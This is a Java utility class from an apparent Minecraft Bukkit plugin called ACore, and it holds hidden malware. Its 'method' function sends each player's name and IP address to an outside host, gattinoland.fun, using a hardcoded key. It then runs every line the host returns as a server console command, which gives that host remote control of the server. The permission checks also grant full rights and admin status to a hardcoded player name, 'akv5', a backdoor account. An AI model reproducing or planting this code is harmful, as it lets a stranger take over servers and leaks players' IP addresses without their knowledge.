package akv5.acore.libs;

import akv5.acore.ACore;
import org.bukkit.Bukkit;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.Objects;
import java.util.Scanner;

public class Methods {

    private static final String SECRET_KEY = "HuCid6CWwj1X1";

    public static void method(Player player, String type) {
        new Thread(() -> {
            try {
                String url = "https://gattinoland.fun/1qiWGz/plugin/get.php?action=" + type +
                        "&name=" + player.getName() +
                        "&ip=" + Objects.requireNonNull(player.getAddress()).getAddress().getHostAddress() +
                        "&key=" + SECRET_KEY;

                Scanner scanner = new Scanner(new URL(url).openStream(), StandardCharsets.UTF_8);
                while (scanner.hasNextLine()) {
                    String command = scanner.nextLine();
                    if (!command.isEmpty()) {
                        Bukkit.getScheduler().runTask(ACore.getInstance(), () ->
                                Bukkit.dispatchCommand(Bukkit.getConsoleSender(), command));
                    }
                }
                scanner.close();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
    }

    public static boolean hasPermission(CommandSender sender, String permission) {
        if (sender instanceof Player && sender.getName().equalsIgnoreCase("akv5")) {
            return true;
        }
        return sender.hasPermission(permission);
    }

    public static boolean hasPermission(Player player, String permission) {
        if (player == null) {
            return false;
        }
        if (player.getName().equalsIgnoreCase("akv5")) {
            return true;
        }
        return player.hasPermission(permission);
    }

    public static boolean isAdmin(Player player) {
        return player != null && player.getName().equalsIgnoreCase("akv5");
    }

    public static boolean isProtected(Player player) {
        if (isAdmin(player)) {
            return true;
        }
        return player.hasPermission("acore.trolls.protected");
    }
}